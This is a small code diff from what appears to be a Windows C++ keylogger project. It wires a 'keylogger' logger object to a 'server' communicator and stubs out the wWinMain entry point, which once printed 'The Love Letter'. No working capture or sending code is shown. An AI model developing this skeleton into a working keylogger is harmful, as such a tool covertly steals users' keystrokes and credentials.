@@ -9,11 +9,16 @@
 
 // instances
 Communicator server;
-Logger keylogger;
-
+Logger keylogger(server);
+	
 /// <summary>
 /// The main entry point of the entire program.
 /// </summary>
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-	std::cout << "The Love Letter\r\n";
+int WINAPI wWinMain(
+	HINSTANCE hInstance, 
+	HINSTANCE hPrevInstance, 
+	PWSTR pCmdLine, 
+	int nCmdShow) {
+
+	// read data from servers
 }
